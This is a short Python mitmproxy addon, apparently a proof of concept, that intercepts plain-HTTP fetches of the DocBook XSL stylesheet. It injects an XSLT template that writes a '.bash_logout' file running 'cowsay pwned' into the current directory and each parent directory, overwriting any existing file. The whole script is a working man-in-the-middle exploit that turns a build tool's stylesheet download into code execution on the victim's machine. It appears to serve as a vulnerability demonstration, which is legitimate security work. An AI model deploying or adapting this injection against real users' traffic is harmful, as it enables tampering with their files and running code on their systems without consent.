# encoding=UTF-8

# Copyright © 2021 Jakub Wilk <jwilk@jwilk.net>
# SPDX-License-Identifier: MIT

# ⚠ WARNING ⚠
# While the malware delivered by the proxy is relatively mild,
# it will happily overwrite existing files on disk.
# Use the proxy only against throw-away systems.

# Usage:
#   mitmdump --listen-host 127.0.0.1 -s /path/to/docbook_xsl_mitm.py
# and then:
#   export http_proxy=http://127.0.0.1:8080/
#   xsltproc http://docbook.sourceforge.net/release/xsl/current/manpages/docbook.xsl foo.xml
# or:
#   export http_proxy=http://127.0.0.1:8080/
#   a2x -f manpage bar.adoc

import re
import xml.sax.saxutils as saxutils

file_name = '.bash_logout'
file_data = 'cowsay pwned\n'

# FIXME: I couldn't find a way to determine home directory with XSL.
# Oh well, let's hope cwd is within $HOME, and try ".", "..", "../.."
# and so on.
code = r'''
<xsl:template name="pwn.recursive">
    <xsl:param name="dir" select="'.'"/>
    <xsl:if test="string-length($dir) &lt; 100">
        <exsl:document href="{{$dir}}/{name}" method="text">{data}</exsl:document>
        <xsl:call-template name="pwn.recursive">
            <xsl:with-param name="dir" select="concat($dir, '/..')"/>
        </xsl:call-template>
    </xsl:if>
</xsl:template>
'''.format(
    name=saxutils.escape(file_name),
    data=saxutils.escape(file_data),
)

def should_infect(url):
    return (
        url.startswith('http://docbook.sourceforge.net/release/xsl/') and
        url.endswith('/docbook.xsl')
    )

def response(flow):
    if not should_infect(flow.request.url):
        return
    text = flow.response.text
    text = re.sub(
        '(<xsl:stylesheet) ',
        r'\1 extension-element-prefixes="exsl" ',
        text
    )
    text = re.sub(
        '(<xsl:template match="/">)',
        r'{code}\1\n<xsl:call-template name="pwn.recursive"/>\n'.format(code=code),
        text
    )
    flow.response.text = text

# vim:ts=4 sts=4 sw=4 et
